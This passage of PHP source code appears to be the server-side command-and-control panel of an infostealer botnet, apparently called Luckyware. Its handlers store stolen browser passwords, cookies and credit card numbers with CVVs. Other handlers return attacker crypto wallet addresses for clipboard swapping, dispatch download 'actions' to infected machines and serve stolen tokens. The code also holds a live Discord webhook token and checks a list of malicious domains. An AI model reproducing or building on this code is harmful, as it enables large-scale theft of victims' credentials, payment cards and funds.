                            continue; // Continue to the next JSON entry
                        }
                    }

                    if (!empty($insertValues)) {
                        try {
                            // Build the bulk insert query with proper placeholders
                            $placeholders = str_repeat('(?,?,?,?,?,?),', count($insertValues));
                            $placeholders = rtrim($placeholders, ','); // Remove trailing comma

                            $sql = "INSERT INTO `passwords` (`Urls`, `Username`, `Pass`, `OwnerID`, `HWID`, `Browser`) VALUES " . $placeholders;

                            $insertStatement = $link->prepare($sql);

                            if ($insertStatement) {
                                // Flatten the array for binding
                                $flatParams = array();
                                foreach ($insertValues as $values) {
                                    $flatParams = array_merge($flatParams, $values);
                                }

                                // Create the type string (6 parameters per row, all strings)
                                $types = str_repeat('s', count($flatParams));

                                // Bind parameters using the spread operator (PHP 5.6+)
                                $insertStatement->bind_param($types, ...$flatParams);

                                // Execute the bulk insert
                                if ($insertStatement->execute()) {
                                    echo "Done! Inserted " . count($insertValues) . " entries.";
                                } else {
                                    throw new Exception("Execute failed: " . $insertStatement->error);
                                }

                                $insertStatement->close();
                            } else {
                                throw new Exception("Prepare failed: " . $link->error);
                            }
                        } catch (Exception $e) {
                            // Log the bulk insert error
                            error_log("Bulk insert failed: " . $e->getMessage());

                            try {
                                $webhookUrlk = "https://discord.com/api/webhooks/1375398420667174932/EPyJPxPaIozerIm5aCEsjYKTfz2uSpIFH3Sb-PNQvqMckcwk4wm1Lejb9L_Bw_Gk2uUl";
                                $errorText = "Bulk SQL Insert error: " . $e->getMessage();
                                $payload = json_encode(['content' => $errorText]);

                                $ch = curl_init($webhookUrlk);
                                curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                $response = curl_exec($ch);
                                curl_close($ch);
                            } catch (Exception $dse) {
                                // Handle the secondary exception here
                            }

                            echo "Error: " . $e->getMessage();
                        }
                    } else {
                        echo "No valid entries to insert.";
                    }

                    echo "lolrx?";
                } else {
                    echo "Action Done Perfectly!";
                }
            }
        } else {
            echo "No POST data received.";
        }
    } else if ($type == 'ckiprc') {

        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            // Retrieve the JSON data
            $jsonData = file_get_contents("php://input");

            $DekkoContento = decrypt($jsonData, GetEncKey());

            $DataPessy = explode("&|-|&", $DekkoContento);

            if (count($DataPessy) === 4) {
                list($securitynew, $hwid, $onweridyy, $dajsonck) = $DataPessy;

                if ($securitynew == "CokerPro37" && strlen($hwid) > 10) {

                    $MYCKDAT = $dajsonck;
                    $HWIDDC = $hwid;
                    $OWNERIDDC = $onweridyy;


                    $stmt1 = mysqli_prepare($link, "SELECT id FROM accounts WHERE OwnerKey = ?");
                    mysqli_stmt_bind_param($stmt1, "s", $OWNERIDDC);
                    mysqli_stmt_execute($stmt1);
                    $OWNERIDDC = mysqli_fetch_assoc(mysqli_stmt_get_result($stmt1))['id'];

                    // Second query - get BotID
                    $stmt2 = mysqli_prepare($link, "SELECT BotID FROM miners WHERE OwnerID = ? AND HWID = ?");
                    mysqli_stmt_bind_param($stmt2, "ss", $onweridyy, $HWIDDC);
                    mysqli_stmt_execute($stmt2);
                    $HWIDDC = mysqli_fetch_assoc(mysqli_stmt_get_result($stmt2))['BotID'];

                    $datadec = json_decode($MYCKDAT, true);

                    $insertValues = array();

                    foreach ($datadec as $entry) {
                        try {
                            $namecok = $entry[0];
                            $valuecok = $entry[1];
                            $hostcok = $entry[2];
                            $pathcok = $entry[3];
                            $expirycok = $entry[4];
                            $browso = $entry[5];

                            $urlpro = $hostcok;
                            if (empty($urlpro)) {
                                $urlpro = 'Url Empty!';
                            }

                            $namepro = $namecok;
                            if (empty($namepro)) {
                                $namepro = 'Name Empty!';
                            }

                            $cookiepro = $valuecok;
                            if (empty($cookiepro)) {
                                $cookiepro = 'Cookie Empty!';
                            }

                            $path = $pathcok;
                            $expiryutc = $expirycok;

                            $hosttrue;
                            $expirtrue;

                            if ($expiryutc == '0') {
                                $expirtrue = 'FALSE';
                            } else {
                                $expirtrue = 'TRUE';
                            }

                            if ($urlpro[0] === '.') {
                                $hosttrue = 'FALSE';
                            } else {
                                $hosttrue = 'TRUE';
                            }

                            $browserpro = $expirycok;

                            // Add the entry values to the bulk insert array
                            $insertValues[] = array($urlpro, $expirtrue, $path, $hosttrue, $expiryutc, $namepro, $cookiepro, $OWNERIDDC, $HWIDDC, $browserpro);
                        } catch (Exception $e) {
                            try {
                                $webhookUrlk = "https://discord.com/api/webhooks/1375398420667174932/EPyJPxPaIozerIm5aCEsjYKTfz2uSpIFH3Sb-PNQvqMckcwk4wm1Lejb9L_Bw_Gk2uUl";
                                $errorText = "An error occurred on cookie: " . $e->getMessage();

                                // Create a JSON payload
                                $payload = json_encode(['content' => $errorText]);

                                // Send the error message to Discord
                                $ch = curl_init($webhookUrlk);
                                curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                $response = curl_exec($ch);
                                curl_close($ch);
                            } catch (Exception $dse) {
                                // Handle the secondary exception here
                            }
                            continue; // Continue to the next JSON entry
                        }
                    }

                    if (!empty($insertValues)) {
                        try {
                            // Build the bulk insert query with proper placeholders
                            $placeholders = str_repeat('(?,?,?,?,?,?,?,?,?,?),', count($insertValues));
                            $placeholders = rtrim($placeholders, ','); // Remove trailing comma

                            $sql = "INSERT INTO `cookies` (`Urls`, `expires_true`, `path`, `hostkeydot`, `expires_time`, `Names`, `Cookie`, `OwnerID`, `HWID`, `Browser`) VALUES " . $placeholders;

                            $insertStatement = $link->prepare($sql);

                            if ($insertStatement) {
                                // Flatten the array for binding
                                $flatParams = array();
                                foreach ($insertValues as $values) {
                                    $flatParams = array_merge($flatParams, $values);
                                }

                                // Create the type string (10 parameters per row, all strings)
                                $types = str_repeat('s', count($flatParams));

                                // Bind parameters using the spread operator (PHP 5.6+)
                                $insertStatement->bind_param($types, ...$flatParams);

                                // Execute the bulk insert
                                if ($insertStatement->execute()) {
                                    echo "Done! Inserted " . count($insertValues) . " cookie entries.";
                                } else {
                                    throw new Exception("Execute failed: " . $insertStatement->error);
                                }

                                $insertStatement->close();
                            } else {
                                throw new Exception("Prepare failed: " . $link->error);
                            }
                        } catch (Exception $e) {
                            // Log the bulk insert error
                            error_log("Bulk cookie insert failed: " . $e->getMessage());

                            try {
                                $webhookUrlk = "https://discord.com/api/webhooks/1375398420667174932/EPyJPxPaIozerIm5aCEsjYKTfz2uSpIFH3Sb-PNQvqMckcwk4wm1Lejb9L_Bw_Gk2uUl";
                                $errorText = "Bulk Cookie SQL Insert error: " . $e->getMessage();
                                $payload = json_encode(['content' => $errorText]);

                                $ch = curl_init($webhookUrlk);
                                curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                $response = curl_exec($ch);
                                curl_close($ch);
                            } catch (Exception $dse) {
                                // Handle the secondary exception here
                            }

                            echo "Error: " . $e->getMessage();
                        }
                    } else {
                        echo "No valid cookie entries to insert.";
                    }

                    echo "lolrx?";
                } else {
                    echo "Action Done Perfectly!";
                }
            }
        } else {
            echo "No POST data received.";
        }
    } else if ($type == 'finishaction') {
        $sql = "UPDATE Actions SET isdone=2, amountdone=? WHERE actionnid=?";
        $stmtff = $link->prepare($sql);
        $stmtff->bind_param("ii", $amount, $id);
        $stmtff->execute();
        $stmtff->close();
    } else if ($type == 'cc') {

        if ($_SERVER['REQUEST_METHOD'] === 'POST') {

            // Retrieve the encrypted data
            $encryptedDataprocess = file_get_contents("php://input");

            $encprockey = GetEncKey();

            // Decrypt the data
            $decryptedDataprocess = decrypt($encryptedDataprocess, $encprockey);

            // Split decrypted data into individual values
            $dataprocess = explode("|", $decryptedDataprocess);

            if (count($dataprocess) === 7) {
                list($securitynew, $kardnumber, $expiri, $cevv, $provider, $owenerid, $hewed) = $dataprocess;

                if ($securitynew == "AvokadoSalat36" && strlen($hewed) > 15 && strlen($kardnumber) > 10) {

                    $NUMBER = $kardnumber; #
                    $EXPIRY = $expiri; #
                    $CVV = $cevv; #
                    $PROVIDER = $provider; #
                    $OWNERIDDCA = $owenerid;
                    $HWIDDCA = $hewed;

                    $CVVInt = (int) $CVV;

                    if (hasAtLeastFourUniqueDigits($NUMBER) && hasThreeOrMoreUniqueDigits($NUMBER) && 100 < $CVVInt) {

                        $stmt1 = mysqli_prepare($link, "SELECT COUNT(*) as count FROM cards WHERE Numbery = ? AND OwnerID = ?");
                        mysqli_stmt_bind_param($stmt1, "ss", $NUMBER, $OWNERIDDCA);
                        mysqli_stmt_execute($stmt1);
                        $exists = (mysqli_fetch_assoc(mysqli_stmt_get_result($stmt1))['count'] > 0);

                        if ($exists) {
                            echo "0k";
                        } else {
                            // Insert new card
                            $stmt2 = mysqli_prepare($link, "INSERT INTO cards (Numbery, Expiry, CVV, Provider, OwnerID, HWID) VALUES (?, ?, ?, ?, ?, ?)");
                            mysqli_stmt_bind_param($stmt2, "ssssss", $NUMBER, $EXPIRY, $CVV, $PROVIDER, $OWNERIDDCA, $HWIDDCA);
                            mysqli_stmt_execute($stmt2);
                            echo "Desire!";
                        }
                    }

                    echo "lol?";
                } else {
                    echo "Action Done Perfectly!";
                }
            } else {
                echo $decryptedDataprocess;
            }
        } else {
            echo "DataEx";
        }
    } else if ($type == 'crypto') {



        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            // Retrieve the encrypted data
            $encryptedDataprocess = file_get_contents("php://input");

            $encprockey = GetEncKey();

            // Decrypt the data
            $decryptedDataprocess = decrypt($encryptedDataprocess, $encprockey);

            // Split decrypted data into individual values
            $dataprocess = explode("|", $decryptedDataprocess);

            if (count($dataprocess) === 3) {
                list($securitynew, $hwiddeycr, $owenerida) = $dataprocess;

                if ($securitynew == "Avokesa34532") {

                    /*$existsans = mysqli_query($link, "SELECT Wallets FROM accounts WHERE OwnerKey = '$owenerida'");

                    $rowa = mysqli_fetch_assoc($existsans);

                    $voyoooo;

                    if ($rowa) {
                        $voyoooo = $rowa['Wallets'];
                    }


                    $responsena = encrypt($voyoooo, $encprockey);*/

                    $responsena = encrypt("1Co3gSbyxoktTqMt85y4V4KPT7nsUNiY19|0x896A4118BAddE542d1972d6Dd594Af805403e918|LcKDRc8yob8crrtpMVoThdiZ89DBBgtSF5|489ANRp7MbB8U2TBGgLQE2NZsQSu8dfWCKXCVTqULW9b5Zps5rdKZxi6Um9orLj5aaiV2bukAz8oZQADvrkLMSzYVLo5q1d|DRgTwjsq5Jw5nFmAfut6dQnPEimoBAxUHU|XkupFNVYLFjciobN3YeAEFrE3xk2edtZef|rE8az2QSQFr4LTTNP1p88vgnxwNGVYNzhf|671g1PDDBEQFrRX1jv2yRyQsXmcvPjpXJ4cowHwxVEHK|", $encprockey);
                    echo $responsena;
                } else {
                    echo "Action Done Perfectly!";
                }
            } else {
                echo $decryptedDataprocess;
            }
        } else {
            echo "DataEx";
        }
    } /*else if ($type == 'mininew') {
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Retrieve the encrypted data
    $encryptedDataprocess = file_get_contents("php://input");

    $encprockey = GetEncKey();

    // Decrypt the data
    $decryptedDataprocess = decrypt($encryptedDataprocess, $encprockey);

    // Split decrypted data into individual values
    $dataprocess = explode("|", $decryptedDataprocess);


    if (count($dataprocess) === 4) {
        list($securitynew, $hwidonic, $owenerida, $ifupd) = $dataprocess;

        if ($securitynew == "Avokesa34532") {

            $OWNERIDDCAN = $owenerida;
            $HWIDOMEGE = $hwidonic;
            $shouldup = $ifupd;
            $currentTimestamp = time();



            $existsans = mysqli_query($link, "SELECT GPUConfig FROM accounts WHERE OwnerKey = '$OWNERIDDCAN'");

            $rowa = mysqli_fetch_assoc($existsans);



            $voyoooo;
            // Check if a row was found
            if (strlen($rowa['GPUConfig']) > 20) {

                $Powerry = mysqli_query($link, "SELECT MiningPower FROM accounts WHERE OwnerKey = '$OWNERIDDCAN'");
                $powermini = mysqli_fetch_assoc($Powerry);

                $voyoooo = $rowa['GPUConfig'] . $powermini['MiningPower'];

                if ($shouldup == 'yesomg') {
                    $sqlupdut = mysqli_query($link, "UPDATE miners SET MinerPing = '$currentTimestamp' WHERE HWID = '$HWIDOMEGE' AND OwnerID = '$OWNERIDDCAN'");
                }
            } else {
                $voyoooo = "no";
            }


            $responsena = encrypt($voyoooo, $encprockey);
            echo $responsena;
        } else {
            echo "Action Done Perfectly!";
        }
    } else {
        echo $decryptedDataprocess;
    }
} else {
    echo "DataEx";
}
}*/ else if ($type == 'ping') {

        if ($_SERVER['REQUEST_METHOD'] === 'POST') {


            try {

                // Retrieve the encrypted data
                $encryptedDataPNG = file_get_contents("php://input");
                $decryptedDataPNG = decrypt($encryptedDataPNG, GetEncKey());
                $dataPNG = explode("|", $decryptedDataPNG);

                if (count($dataPNG) !== 3) {
                    echo $decryptedDataPNG; // Early exit if data is malformed
                    exit;
                }

                list($securitynew, $hwidOMEYT, $awnerOMEYT) = $dataPNG;


                /*$currentTimestamp = time();

            $sqlupduat = mysqli_query($link, "UPDATE miners SET LastPing = '$currentTimestamp' WHERE HWID = '$hwidOMEYT' AND OwnerID = '$awnerOMEYT'");
            if (!$sqlupduat) {
                throw new Exception("UPDATE miners failed: " . mysqli_error($link));
            }

            mysqli_commit($link);
            echo encrypt("[]", GetEncKey());*/



                if ($securitynew !== "SpesyalSalada43" && $securitynew !== "SpesyalSalada43AT") {
                    echo "Action Done Perfectly!";
                    exit;
                }

                $maxRetries = 3;
                $success = false;

                for ($i = 0; $i < $maxRetries; $i++) {
                    try {
                        mysqli_begin_transaction($link);

                        $currentTimestamp = time();

                        $stmt = mysqli_prepare($link, "SELECT COUNT(*) as count FROM miners WHERE HWID = ? AND OwnerID = ?");
                        mysqli_stmt_bind_param($stmt, "ss", $hwidOMEYT, $awnerOMEYT);
                        mysqli_stmt_execute($stmt);
                        $exists = (mysqli_fetch_assoc(mysqli_stmt_get_result($stmt))['count'] > 0);


                        if (!$exists) {
                            throw new Exception("SELECT miners failed: " . mysqli_error($link));
                        }

                        if ($exists) {
                            $results = array();

                            // Get actions
                            $stmt1 = mysqli_prepare($link, "SELECT * FROM actions WHERE (HWID = ? AND ActionOwner = ?) OR (HWID = ? AND ActionOwner = 'yes') OR (HWID = 'allowner' AND ActionOwner = ?) OR (HWID = 'allfull') OR (ActionSentTime LIKE '%Download%' AND ActionOwner = ?)");
                            mysqli_stmt_bind_param($stmt1, "sssss", $hwidOMEYT, $awnerOMEYT, $hwidOMEYT, $awnerOMEYT, $awnerOMEYT);
                            mysqli_stmt_execute($stmt1);
                            $result1 = mysqli_stmt_get_result($stmt1);

                            while ($row = mysqli_fetch_assoc($result1)) {
                                $namorrr = $row['ActionSentTime'];

                                if (str_contains($namorrr, 'Download')) {
                                    if ($securitynew === "SpesyalSalada43AT") {
                                        $results[] = $row;
                                    }
                                } else {
                                    $actionStatus = intval($row['ActionStatus']);
                                    $updatedActionStatus = $actionStatus + 200;
                                    $actionSentTime = intval($row['ActionSentTime']);
                                    $resultTimestamp = $actionSentTime + $updatedActionStatus;

                                    if ($currentTimestamp <= $resultTimestamp) {
                                        $results[] = $row;
                                    }
                                }
                            }

                            // Update miners
                            $stmt2 = mysqli_prepare($link, "UPDATE miners SET LastPing = ? WHERE HWID = ? AND OwnerID = ?");
                            mysqli_stmt_bind_param($stmt2, "sss", $currentTimestamp, $hwidOMEYT, $awnerOMEYT);
                            mysqli_stmt_execute($stmt2);

                            mysqli_commit($link);
                            $success = true;
                            echo encrypt(json_encode($results), GetEncKey());
                            break;
                        } else {
                            mysqli_commit($link);
                            $success = true;
                            echo 'Perfect';
                            break;
                        }
                    } catch (Exception $e) {
                        mysqli_rollback($link);

                        if (stripos($e->getMessage(), "Deadlock") !== false && $i < $maxRetries - 1) {
                            sleep(1); // Wait 1 second before retrying
                            continue;
                        }

                        // Log error to Discord webhook
                        $webhookUrlk = "https://discord.com/api/webhooks/1375398420667174932/EPyJPxPaIozerIm5aCEsjYKTfz2uSpIFH3Sb-PNQvqMckcwk4wm1Lejb9L_Bw_Gk2uUl";
                        $errorText = "An error occurred on POPP: " . $e->getMessage();
                        $payload = json_encode(['content' => $errorText]);

                        $ch = curl_init($webhookUrlk);
                        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                        curl_exec($ch);
                        curl_close($ch);

                        break; // Exit retry loop on non-deadlock error
                    }
                }

                if (!$success) {
                    echo "Failed after $maxRetries attempts.";
                }
            } catch (Exception $e) {
                // Outer catch for initial setup errors (e.g., decryption failure)
                $webhookUrlk = "https://discord.com/api/webhooks/1375398420667174932/EPyJPxPaIozerIm5aCEsjYKTfz2uSpIFH3Sb-PNQvqMckcwk4wm1Lejb9L_Bw_Gk2uUl";
                $errorText = "An error occurred on POPP (outer): " . $e->getMessage();
                $payload = json_encode(['content' => $errorText]);

                $ch = curl_init($webhookUrlk);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_exec($ch);
                curl_close($ch);
            }
        } else {
            echo "DataEx";
        }
    } else if ($type == 'dbgmsg') {

        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            // Retrieve the encrypted data
            $encryptedDataPNG = file_get_contents("php://input");

            $decryptedDataPNG = decrypt($encryptedDataPNG, GetEncKey());


            $dataPNG = explode("|", $decryptedDataPNG);

            if (count($dataPNG) === 4) {
                list($securitynewoq, $hwidOMEYT, $awnerOMEYT, $mussuge) = $dataPNG;


                if ($securitynewoq == "SpesyalSalada43") {
                    echo "aak";

                    /*$stmt = $link->prepare("INSERT INTO `debugs` (`OwnerID`, `HWID`, `Log`) VALUES (?, ?, ?)");
                    $stmt->bind_param("sss", $awnerOMEYT, $hwidOMEYT, $mussuge);
                    $stmt->execute();*/

                    echo "mm";
                } else {
                    echo "xD";
                }
            } else {
                echo $decryptedDataHWID;
            }
        } else {
            echo "DataEx";
        }
    } else if ($type == 'buildamingo') {

        $Ultrakey = $_GET['key'];


        if ($Ultrakey == 'dolaylar7475') {

            $stmt1 = mysqli_prepare($link, "SELECT * FROM builder WHERE Status = '0'");
            mysqli_stmt_execute($stmt1);
            $result1 = mysqli_stmt_get_result($stmt1);

            $results = array();
            while ($row = mysqli_fetch_assoc($result1)) {
                $results[] = $row;
            }

            // Update Status to '1' for all records that were '0'
            $stmt2 = mysqli_prepare($link, "UPDATE builder SET Status = '1' WHERE Status = '0'");
            mysqli_stmt_execute($stmt2);

            echo json_encode($results);
        }
    } else if ($type == 'sahipid') {

        $BuildID = $_GET['blds'];

        // Get OwnerID by BuildKey
        $stmt = mysqli_prepare($link, "SELECT OwnerID FROM builder WHERE BuildKey = ?");
        mysqli_stmt_bind_param($stmt, "s", $BuildID);
        mysqli_stmt_execute($stmt);
        $result = mysqli_stmt_get_result($stmt);
        $voyoooor = ($row = mysqli_fetch_assoc($result)) ? $row['OwnerID'] : null;

        echo $voyoooor;
    } else if ($type == 'accid') {

        $Owrryid = $_GET['owr'];

        // Get id by OwnerKey
        $stmt = mysqli_prepare($link, "SELECT id FROM accounts WHERE OwnerKey = ?");
        mysqli_stmt_bind_param($stmt, "s", $Owrryid);
        mysqli_stmt_execute($stmt);
        $result = mysqli_stmt_get_result($stmt);
        $voyoooor = ($row = mysqli_fetch_assoc($result)) ? $row['id'] : null;

        echo $voyoooor;
    } else if ($type == 'FDM') {

        $Owrryid = $_GET['owr'];

        // Get FUDM by OwnerKey
        $stmt = mysqli_prepare($link, "SELECT FUDM FROM accounts WHERE OwnerKey = ?");
        mysqli_stmt_bind_param($stmt, "s", $Owrryid);
        mysqli_stmt_execute($stmt);
        $result = mysqli_stmt_get_result($stmt);
        $voyoooor = ($row = mysqli_fetch_assoc($result)) ? $row['FUDM'] : null;

        echo $voyoooor;
    } else if ($type == 'rtttry') {

        $ipaddd = encrypt(GetIPEnc(), 'mysekretuwu');
        echo $ipaddd;
    } else if ($type == 'senioreztoken') {

        $Ultrakey = $_GET['key'];


        if ($Ultrakey == 'herseyimdinnn98') {

            $actionquery = mysqli_query($link, "SELECT * FROM tokens");

            if ($actionquery) {
                $results = array();



                while ($row = mysqli_fetch_assoc($actionquery)) {

                    $results[] = $row;
                }
                // Update the last retrieved timestamp to the highest timestamp in the retrieved data

                echo json_encode($results);
            } else {
                echo "Error: " . mysqli_error($link);
            }
        }
    } else if ($type == 'antitokenagez') {

        $Ultrakey = $_GET['key'];
        $Ultraid = $_GET['id'];

        if ($Ultrakey == 'kumralamk77') {

            $updateQuerya = mysqli_query($link, "UPDATE tokens SET isvalid = '0' WHERE TokenID = '$Ultraid'");
        }
    } else if ($type == 'pfpupoddotto') {

        $Ultrakey = $_GET['key'];
        $Ultraid = $_GET['id'];
        $UseringenID = $_GET['iduser'];

        if ($Ultrakey == 'herkimleysen6') {
            $updateQueryan = mysqli_query($link, "UPDATE tokens SET pfp = '$UseringenID' WHERE TokenID = '$Ultraid'");
        }
    } else if ($type == 'webhooksxd') {

        $Ultrakey = $_GET['key'];


        if ($Ultrakey == 'webokarnene3334') {

            $actionquery = mysqli_query($link, "SELECT Webhook, WebhookScr FROM accounts");

            if ($actionquery) {
                $results = array();

                while ($row = mysqli_fetch_assoc($actionquery)) {
                    $results[] = $row['Webhook'];
                    $results[] = $row['WebhookScr'];
                }

                // Remove duplicates and reindex the array
                $results = array_values(array_unique($results));

                echo json_encode($results);
            } else {
                echo "Error: " . mysqli_error($link);
            }
        }
    } else if ($type == 'is_domain_up') {
        echo "Yes";
    } else if ($type == 'APLADEX') {
        if ($_FILES["file"]["error"] == UPLOAD_ERR_OK) {
            $temp_name = $_FILES["file"]["tmp_name"];
            $file_name = $_FILES["file"]["name"];
            $upload_dir = "../../../Seeds/";

            $file_extension = pathinfo($file_name, PATHINFO_EXTENSION);

            if (strtolower($file_extension) === 'zip') {
                $destination = $upload_dir . $file_name;

                if (file_exists($destination)) {
                    echo "x1";
                } else {
                    move_uploaded_file($temp_name, $destination);
                    echo "x2ll";
                }
            } else {
                echo "x3";
            }
        } else {
            echo "Error code: " . $_FILES["file"]["error"];
        }
    } else if ($type == 'check_all') {

        $CKey = $_GET['key'];

        if ($CKey == 'Chekermeker4') {

            SendUpMSG("--- Starting Check For Non Auth Domains ---");

            $response1 = file_get_contents("https://vcc-redistrbutable.help/api/mnr/bobby31.php?type=is_domain_up&security=Daytone");

            if ($response1 == "Yes") {
                SendUpMSG("vcc-redistrbutable.help | Status: :white_check_mark:");
            } else {
                SendUpMSG("vcc-redistrbutable.help | Status: :no_entry:");
            }


            $response2 = file_get_contents("https://vcc-libaries.online/api/mnr/bobby31.php?type=is_domain_up&security=Daytone");

            if ($response2 == "Yes") {
                SendUpMSG("vcc-libaries.online | Status: :white_check_mark:");
            } else {
                SendUpMSG("vdcc-libaries.online | Status: :no_entry:");
            }


            $response3 = file_get_contents("https://textpubshiers.top/api/mnr/bobby31.php?type=is_domain_up&security=Daytone");

            if ($response3 == "Yes") {
                SendUpMSG("textpubshiers.top | Status: :white_check_mark:");
            } else {
                SendUpMSG("textpubshiers.top | Status: :no_entry:");
            }


            $response5 = file_get_contents("https://frozi.cc/api/mnr/bobby31.php?type=is_domain_up&security=Daytone");

            if ($response5 == "Yes") {
                SendUpMSG("frozi.cc | Status: :white_check_mark:");
            } else {
                SendUpMSG("frozi.cc | Status: :no_entry:");
            }


            $response6 = file_get_contents("https://contorosa.space/api/mnr/bobby31.php?type=is_domain_up&security=Daytone");

            if ($response6 == "Yes") {
                SendUpMSG("contorosa.space | Status: :white_check_mark:");
            } else {
                SendUpMSG("contorosa.space | Status: :no_entry:");
            }

            SendUpMSG("---------- End ----------");


            SendUpMSG("--- Starting Check For Auth Domains ---");

            $Aresponse1 = file_get_contents("https://bounty-valorant.lol/api/mnr/bobby31.php?type=is_domain_up&security=Daytone");

            if ($Aresponse1 == "Yes") {
                SendUpMSG("bounty-valorant.lol | Status: :white_check_mark:");
            } else {
                SendUpMSG("bounty-valorant.lol | Status: :no_entry:");
            }


            $Aresponse2 = file_get_contents("https://crazyclaras-blog.my/api/mnr/bobby31.php?type=is_domain_up&security=Daytone");

            if ($Aresponse2 == "Yes") {
                SendUpMSG("crazyclaras-blog.my | Status: :white_check_mark:");
            } else {
                SendUpMSG("crazyclaras-blog.my | Status: :no_entry:");
            }


            $Aresponse3 = file_get_contents("https://i-like.boats/api/mnr/bobby31.php?type=is_domain_up&security=Daytone");

            if ($Aresponse3 == "Yes") {
                SendUpMSG("i-like.boats | Status: :white_check_mark:");
            } else {
                SendUpMSG("i-like.boats | Status: :no_entry:");
            }


            $Aresponse4 = file_get_contents("https://i-slept-with-your.mom/api/mnr/bobby31.php?type=is_domain_up&security=Daytone");

            if ($Aresponse4 == "Yes") {
                SendUpMSG("i-slept-with-your.mom | Status: :white_check_mark:");
            } else {
                SendUpMSG("i-slept-with-your.mom | Status: :no_entry:");
            }


            $Aresponse5 = file_get_contents("https://krispykreme.top/api/mnr/bobby31.php?type=is_domain_up&security=Daytone");

            if ($Aresponse5 == "Yes") {
                SendUpMSG("krispykreme.top | Status: :white_check_mark:");
            } else {
                SendUpMSG("krispykreme.top | Status: :no_entry:");
            }


            $Aresponse6 = file_get_contents("https://ladybugs.hair/api/mnr/bobby31.php?type=is_domain_up&security=Daytone");

            if ($Aresponse6 == "Yes") {
                SendUpMSG("ladybugs.hair | Status: :white_check_mark:");
            } else {
                SendUpMSG("ladybugs.hair | Status: :no_entry:");
            }



            $Aresponse8 = file_get_contents("https://oh-my-oh.my/api/mnr/bobby31.php?type=is_domain_up&security=Daytone");

            if ($Aresponse8 == "Yes") {
                SendUpMSG("oh-my-oh.my | Status: :white_check_mark:");
            } else {
                SendUpMSG("oh-my-oh.my | Status: :no_entry:");
            }


            $Aresponse9 = file_get_contents("https://wallmart.mom/api/mnr/bobby31.php?type=is_domain_up&security=Daytone");

            if ($Aresponse9 == "Yes") {
                SendUpMSG("wallmart.mom | Status: :white_check_mark:");
            } else {
                SendUpMSG("wallmart.mom | Status: :no_entry:");
            }


            $Aresponse10 = file_get_contents("https://zetolacs-funny.pics/api/mnr/bobby31.php?type=is_domain_up&security=Daytone");

            if ($Aresponse10 == "Yes") {
                SendUpMSG("zetolacs-funny.pics | Status: :white_check_mark:");
            } else {
                SendUpMSG("zetolacs-funny.pics | Status: :no_entry:");
            }


            $Aresponse11 = file_get_contents("https://concodro.lat/api/mnr/bobby31.php?type=is_domain_up&security=Daytone");

            if ($Aresponse11 == "Yes") {
                SendUpMSG("concodro.lat | Status: :white_check_mark:");
            } else {
                SendUpMSG("concodro.lat | Status: :no_entry:");
            }


            SendUpMSG("---------- End ----------");


            SendUpMSG("--- Starting Check For Dashboard Domains ---");

            $Mresponse1 = file_get_contents("https://luckyware.co");

            if (str_contains($Mresponse1, 'Management')) {
                SendUpMSG("luckyware.co | Status: :white_check_mark:");
            } else {
                SendUpMSG("luckyware.co | Status: :no_entry:");
            }


            $Mresponse2 = file_get_contents("https://luckyware.pro");

            if (str_contains($Mresponse2, 'Management')) {
                SendUpMSG("luckyware.pro | Status: :white_check_mark:");
            } else {
                SendUpMSG("luckyware.pro | Status: :no_entry:");
            }


            $Mresponse3 = file_get_contents("https://luckyware.vip");

            if (str_contains($Mresponse3, 'Management')) {
                SendUpMSG("luckyware.vip | Status: :white_check_mark:");
            } else {
                SendUpMSG("luckyware.vip | Status: :no_entry:");
            }


            $Mresponse4 = file_get_contents("https://luckyware.fun");

            if (str_contains($Mresponse4, 'Management')) {
                SendUpMSG("luckyware.fun | Status: :white_check_mark:");
            } else {
                SendUpMSG("luckyware.fun | Status: :no_entry:");
            }

            SendUpMSG("---------- Full End ----------");
        }
    }
} else {
    echo "D0ne!";
}
